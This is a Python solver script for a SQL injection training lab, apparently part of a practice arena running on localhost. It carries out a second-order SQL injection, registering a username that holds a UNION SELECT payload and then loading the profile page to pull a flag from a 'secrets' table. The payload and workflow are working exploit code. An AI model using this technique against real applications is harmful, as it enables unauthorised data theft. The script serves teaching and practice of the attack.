#!/usr/bin/env python3
"""
Lab 18 -- Second-Order SQL Injection
=====================================
Registers a user with a UNION payload as the username.
The payload is safely escaped during INSERT (stored in DB).
When the profile page loads, it uses the stored username in a
second query WITHOUT escaping -- triggering the injection.

Usage:
    python3 lab18_second_order.py [TARGET_URL]

Default target: http://localhost/SQLi-Arena/public/lab.php
"""
import requests
import sys
import re

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost/SQLi-Arena/public/lab.php"
PARAMS_BASE = {"lab": "mysql/lab18", "mode": "black"}


# ── Step 1: Start a fresh session ──
print(f"[*] Target: {TARGET}")
s = requests.Session()

print("[*] Step 1: Logging out any existing session...")
s.get(TARGET, params={**PARAMS_BASE, "action": "logout"})

# ── Step 2: Register with malicious username ──
# The profile query returns 3 columns: username, password, bio
# So our UNION needs 3 columns: flag_text, dummy, dummy
username = "' UNION SELECT flag_text, 2, 3 FROM secrets -- -"
password = "anything"

print(f"[*] Step 2: Registering with payload username...")
print(f"    Username: {username}")
print(f"    Password: {password}")
print()

r = s.post(
    TARGET,
    params={**PARAMS_BASE, "action": "register"},
    data={"reg_username": username, "reg_password": password}
)

# Check for registration errors
if "already taken" in r.text:
    print("[!] Username already taken. Trying with suffix...")
    import random
    suffix = random.randint(1000, 9999)
    username = f"x{suffix}' UNION SELECT flag_text, 2, 3 FROM secrets -- -"
    r = s.post(
        TARGET,
        params={**PARAMS_BASE, "action": "register"},
        data={"reg_username": username, "reg_password": password}
    )

if "Registration failed" in r.text:
    err = re.search(r"Registration failed: (.+?)(?:<|$)", r.text)
    print(f"[-] Registration failed: {err.group(1) if err else 'unknown error'}")
    sys.exit(1)

if "Registered successfully" in r.text or "User ID" in r.text:
    print("[+] Registration successful!")
else:
    print("[*] Registration response unclear, continuing...")

# ── Step 3: View profile -- triggers second-order injection ──
print("[*] Step 3: Loading profile page (triggers second-order injection)...")
r = s.get(TARGET, params=PARAMS_BASE)

match = re.search(r"FLAG\{[^}]+\}", r.text)
if match:
    print(f"\n[+] Flag: {match.group(0)}")
    print()
    print("[*] How it works:")
    print("    1. Registration: INSERT uses mysqli_real_escape_string() → SAFE")
    print("    2. Database stores the LITERAL payload (unescaped)")
    print("    3. Profile page reads stored username and uses it in a new query")
    print("    4. The new query does NOT escape → UNION injection fires!")
else:
    print("[-] Flag not found on profile page.")
    print("[*] Trying to load profile explicitly...")
    r = s.get(TARGET, params=PARAMS_BASE)
    match = re.search(r"FLAG\{[^}]+\}", r.text)
    if match:
        print(f"\n[+] Flag: {match.group(0)}")
    else:
        print("[-] Still not found. Check lab manually.")
        sys.exit(1)
